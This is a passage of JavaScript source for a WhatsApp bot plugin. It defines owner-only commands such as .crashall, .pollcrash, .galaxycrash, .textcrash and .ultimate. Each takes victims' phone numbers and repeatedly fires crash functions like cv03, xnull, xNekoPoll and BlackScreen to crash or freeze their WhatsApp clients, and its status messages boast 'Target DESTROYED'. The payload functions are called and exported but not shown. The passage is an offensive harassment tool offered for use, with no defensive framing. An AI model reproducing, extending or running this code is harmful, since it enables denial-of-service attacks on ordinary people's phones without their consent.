    react: "💀",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender, mentionedJid }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let targets = [];
    
    if (mentionedJid && mentionedJid.length > 0) {
        targets = mentionedJid;
    } else if (m.quoted) {
        targets = [m.quoted.sender];
    } else if (args[0]) {
        let numbers = args.join(' ').split(' ');
        for (let num of numbers) {
            let number = num.replace(/[^0-9]/g, '');
            if (number.startsWith('0')) number = '255' + number.substring(1);
            targets.push(number + '@s.whatsapp.net');
        }
    } else {
        return reply("❌ Please mention users, reply to a message, or provide numbers\n\nExample: .crashall 255712345678 255798765432");
    }
    
    if (targets.length > 10) return reply("❌ Max 10 targets at once");
    
    reply(`💀 Mass killing ${targets.length} target(s)...`);
    
    for (let target of targets) {
        try {
            await cv03(conn, target);
            await new Promise(r => setTimeout(r, 500));
            await xnull(target);
            await new Promise(r => setTimeout(r, 500));
            await PeriaSoloNoConter(target);
            await new Promise(r => setTimeout(r, 500));
            reply(`✅ Killed: ${target.split('@')[0]}`);
        } catch (e) {
            reply(`❌ Failed: ${target.split('@')[0]} - ${e.message}`);
        }
    }
    
    reply(`💀 Mass kill completed!`);
});

// Command: .pollcrash <number> - Crash using poll message
cmd({
    pattern: "pollcrash",
    alias: ["pollkill", "pcrash"],
    desc: "Crash target using poll message exploit",
    category: "bug",
    react: "📊",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .pollcrash 255712345678");
    }
    
    reply(`📊 Sending poll crash to ${target.split('@')[0]}...`);
    
    try {
        for (let i = 0; i < 5; i++) {
            await xNekoPoll(conn, target);
            await new Promise(r => setTimeout(r, 300));
        }
        reply(`✅ Poll crash sent to ${target.split('@')[0]}! 📊`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

// Command: .galaxycrash <number> - Galaxy message crash
cmd({
    pattern: "galaxycrash",
    alias: ["galaxy", "gcrash"],
    desc: "Crash target using galaxy message exploit",
    category: "bug",
    react: "🌌",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .galaxycrash 255712345678");
    }
    
    reply(`🌌 Sending galaxy crash to ${target.split('@')[0]}...`);
    
    try {
        for (let i = 0; i < 5; i++) {
            await xNekoGalaxy(conn, target);
            await new Promise(r => setTimeout(r, 300));
        }
        reply(`✅ Galaxy crash sent to ${target.split('@')[0]}! 🌌`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

// Command: .textcrash <number> - Text overflow crash
cmd({
    pattern: "textcrash",
    alias: ["tcrash", "overflow"],
    desc: "Crash target with text overflow exploit",
    category: "bug",
    react: "📝",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .textcrash 255712345678");
    }
    
    reply(`📝 Sending text overflow to ${target.split('@')[0]}...`);
    
    try {
        await xorvnsor(conn, target);
        reply(`✅ Text overflow sent to ${target.split('@')[0]}! 📝`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

// Command: .ultimate <number> - Ultimate all-in-one crash
cmd({
    pattern: "ultimate",
    alias: ["total", "megakill", "ultrakill"],
    desc: "Ultimate all-in-one crash - EVERY exploit combined",
    category: "bug",
    react: "👑",
    filename: __filename
},
async(conn, mek, m, { from, args, isOwner, reply, sender }) => {
    if (!isOwner) return reply("❌ Owner only command");
    
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else {
        return reply("❌ Please mention a user or provide a number\n\nExample: .ultimate 55xxxxx");
    }
    
    reply(`👑 ULTIMATE CRASH on ${target.split('@')[0]} - Starting ALL exploits...`);
    
    try {
        // All exploits combined
        await cv03(conn, target);
        await new Promise(r => setTimeout(r, 300));
        await xnull(target);
        await new Promise(r => setTimeout(r, 300));
        await PeriaSoloNoConter(target);
        await new Promise(r => setTimeout(r, 300));
        await BlackScreen(target);
        await new Promise(r => setTimeout(r, 300));
        await zXfreeze(target);
        await new Promise(r => setTimeout(r, 300));
        await SecredDelayNTF(target);
        await new Promise(r => setTimeout(r, 300));
        await DocNull(target);
        await new Promise(r => setTimeout(r, 300));
        await xNekoGalaxy(conn, target);
        await new Promise(r => setTimeout(r, 300));
        await xNekoPoll(conn, target);
        await new Promise(r => setTimeout(r, 300));
        await xorvnsor(conn, target);
        await new Promise(r => setTimeout(r, 300));
        await DelayNew(conn, target);
        
        reply(`👑 ULTIMATE CRASH completed on ${target.split('@')[0]} - Target DESTROYED! 💀👑`);
    } catch (e) {
        reply(`❌ Error: ${e.message}`);
    }
});

module.exports = { 
    cv03, xnull, PeriaSoloNoConter, BlackScreen, zXfreeze, 
    SecredDelayNTF, DocNull, xNekoGalaxy, xNekoPoll, DelayNew, xorvnsor 
};
